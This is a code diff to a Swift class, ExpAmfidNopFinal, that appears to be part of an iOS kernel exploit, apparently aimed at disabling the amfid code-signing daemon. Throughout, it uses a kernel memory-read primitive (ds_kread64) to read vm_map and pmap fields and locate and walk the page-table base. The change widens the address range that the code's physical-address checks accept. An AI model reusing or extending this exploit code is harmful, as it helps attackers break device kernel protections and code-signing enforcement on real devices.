@@ -223,7 +223,7 @@ final class ExpAmfidNopFinal {
         //                   vm_map+0x48 = ttep (PHYSICAL address, page-aligned!)
         // The ttep is stored directly in vm_map, not inside pmap struct
         let rawTtep = ds_kread64(vmMap + 0x48)
-        let ttepIsPhysical = rawTtep != 0 && rawTtep > 0x100000000 && rawTtep < 0xA00000000 && (rawTtep & 0xFFF) == 0
+        let ttepIsPhysical = rawTtep != 0 && rawTtep > 0x100000000 && rawTtep < 0x10000000000 && (rawTtep & 0xFFF) == 0
         log("  vm_map+0x48 as ttep: 0x\(String(format:"%llx", rawTtep)) (phys=\(ttepIsPhysical))")
         
         // Use vm_map+0x48 as ttep if it looks physical
@@ -241,7 +241,7 @@ final class ExpAmfidNopFinal {
         // If vm_map+0x48 didn't work, try pmap+0x8 (common alternative)
         if probeFoundTtep == 0 && pmap != 0 {
             let pmapTtep = ds_kread64(pmap + 0x8)
-            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0xA00000000 && (pmapTtep & 0xFFF) == 0
+            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0x10000000000 && (pmapTtep & 0xFFF) == 0
             if isPhy2 {
                 let l1Test2 = ds_kread64(pmapTtep + 4 * 8)
                 if (l1Test2 & 0x3) == 0x3 {
@@ -606,7 +606,7 @@ final class ExpAmfidNopFinal {
         log("  Scanning for ttep...")
         
         let rawTtep48 = ds_kread64(vmMap + 0x48)
-        let is48Phys = rawTtep48 != 0 && rawTtep48 > 0x100000000 && rawTtep48 < 0xA00000000 && (rawTtep48 & 0xFFF) == 0
+        let is48Phys = rawTtep48 != 0 && rawTtep48 > 0x100000000 && rawTtep48 < 0x10000000000 && (rawTtep48 & 0xFFF) == 0
         if is48Phys {
             let l1Test = ds_kread64(rawTtep48 + 4 * 8)
             if (l1Test & 0x3) == 0x3 {
@@ -617,7 +617,7 @@ final class ExpAmfidNopFinal {
         
         if ttep == 0 {
             let pmapTtep = ds_kread64(pmap + 0x8)
-            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0xA00000000 && (pmapTtep & 0xFFF) == 0
+            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0x10000000000 && (pmapTtep & 0xFFF) == 0
             if isPhy2 {
                 let l1Test2 = ds_kread64(pmapTtep + 4 * 8)
                 if (l1Test2 & 0x3) == 0x3 {
@@ -664,7 +664,7 @@ final class ExpAmfidNopFinal {
         
         // Helper: validate address is readable (kernel VA or physical in DRAM)
         func isReadable(_ addr: UInt64) -> Bool {
-            return (addr >> 32) > 0xFFFFFF00 || (addr > 0x100000000 && addr < 0xA00000000)
+            return (addr >> 32) > 0xFFFFFF00 || (addr > 0x100000000 && addr < 0x10000000000)
         }
         
         // L1
